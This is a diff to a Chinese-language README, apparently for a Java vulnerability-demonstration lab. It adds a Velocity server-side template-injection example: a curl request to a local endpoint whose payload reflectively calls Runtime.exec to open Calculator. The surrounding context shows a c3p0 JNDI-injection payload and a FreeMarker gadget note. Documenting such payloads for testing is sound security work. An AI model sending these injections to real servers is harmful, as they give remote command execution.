@@ -62,6 +62,12 @@ curl 127.0.0.1:8080/jodd/parse -d 'type=com.mchange.v2.c3p0.JndiRefForwardingDat
 
 ### 模板渲染
 
+#### velocity
+
+```
+curl 127.0.0.1:8080/velocity/eval -d 'username=#set($exp%3d"");$exp.getClass().forName("java.lang.Runtime").getRuntime().exec("open /System/Applications/Calculator.app")'
+```
+
 #### freemarker
 
 JythonRuntime需要本地有class: https://tttang.com/archive/1412/
